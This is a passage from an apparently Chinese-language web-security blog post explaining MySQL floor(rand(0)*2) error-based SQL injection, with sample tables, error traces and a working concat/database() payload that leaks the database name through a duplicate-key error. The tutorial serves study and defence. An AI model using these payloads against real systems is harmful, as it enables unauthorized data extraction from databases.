语句用于将数据按照指定的列进行分组，<code>count(*)</code> 用于计算每个分组中的行数，当二者结合使用时，<code>group by</code> 与 <code>count(*)</code> 可以用来统计每个分组中的行数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> gender;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><p>二者连用时，MySQL 会创建一个<strong>虚表</strong>，用来暂时存储指定查询的列及其出现次数。<br>以下是 stus 表的原始数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> stus;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> gender <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> Amy   <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Tom   <span class="operator">|</span> M      <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Sam   <span class="operator">|</span> M      <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Sunny <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Frida <span class="operator">|</span> W      <span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br></pre></td></tr></table></figure><p>调用 <code>group by gender</code>，依次根据 stus 表中的 gender 进行查询计数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询第一行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="comment">-- 查询第二行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> M     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="comment">-- 查询第三行</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> Key   <span class="operator">|</span> <span class="keyword">Value</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> W     <span class="operator">|</span> <span class="number">1</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> M     <span class="operator">|</span> <span class="number">2</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br></pre></td></tr></table></figure><h2 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h2><blockquote><p>Use of a column with <code>RAND()</code> values in an <code>ORDER BY</code> or <code>GROUP BY</code> clause may yield unexpected results because for either clause a <code>RAND()</code> expression can be evaluated multiple times for the same row, each time returning a different result.</p></blockquote><p>当我们在 group by 子句中使用 rand 时，会产生报错，原因是该语句违反唯一性约束。具体来说，MySQL 尝试将结果集按照 <code>floor(rand(0)*2)</code> 的结果进行分组，但在结果集中，存在多个行具有相同的 <code>floor(rand(0)*2)</code> 值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>去掉 rand 函数中的 seed 试验，不会每次都报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> stus <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><h3 id="报错原因分析"><a href="#报错原因分析" class="headerlink" title="报错原因分析"></a>报错原因分析</h3><p>根据上文分析，<code>floor(rand(0)*2)</code> 会产生一个确定的 01 序：01101… </p><ol><li>查询第一行：<code>floor(rand(0)*2)</code> 执行一次，结果为 0，查询虚表发现不存在主键 0，此时 <code>floor(rand(0)*2)</code> 再次被计算，结果为 1，插入虚表。</li><li>查询第二行：<code>floor(rand(0)*2)</code> 结果为 1，而虚表中存在主键 1，所以 <code>floor(rand(0)*2)</code> 不会被计算第二次。</li><li>查询第三行：<code>floor(rand(0)*2)</code> 结果为 0，查询虚表，没有主键 0，于是数据库尝试插入一条新的数据，<strong>在插入数据时<code>floor(rand(0)*2)</code> 被再次计算</strong>，结果 1 作为虚表的主键，早造成主键重复。</li></ol><h3 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h3><blockquote><p><code>group by</code> 在向虚表插入数据时，由于 <code>rand()</code> 多次计算导致虚表主键重复从而报错，又因为报错前 <code>concat()</code> 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果。</p></blockquote><p>将想要查询的语句通过 <code>concat</code> 函数与 <code>floor</code> 语句拼接在一起使之报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line"><span class="comment">-- 下一句是上一句的变形</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span>(concat(<span class="number">0x7e</span>,(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)),<span class="number">0x7e</span>,database()));</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;~1~security&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;&lt;group_key&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h1><hr><ol><li><a href="https://dev.mysql.com/doc/refman/8.0/en">MySQL 8.0 Reference Manual</a></li><li><a href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/">Error Based SQL Injection Using EXP | 🔐Blog of Osanda</a></li><li><a href="https://xz.aliyun.com/t/9849">如何使用 MySQL exp() 函数进行 Sql 注入</a></li><li><a href="https://www.hellomao.top/2019/08/16/web_mysql_floor/">mysql的floor()报错注入方法详细分析 | 小friend的博客</a></li><li><a href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/#group-by-floor-%E6%8A%A5%E9%94%99mysql-5-%E5%8F%AF%E7%94%A8%E9%87%8D%E5%A4%8D%E9%94%AE%E6%8A%A5%E9%94%99">SQL注入 - ro0t</a></li><li><a href="https://flyingfox092.github.io/2021/07/15/floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">floor报错注入原理分析 | 江城子同学</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Websec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
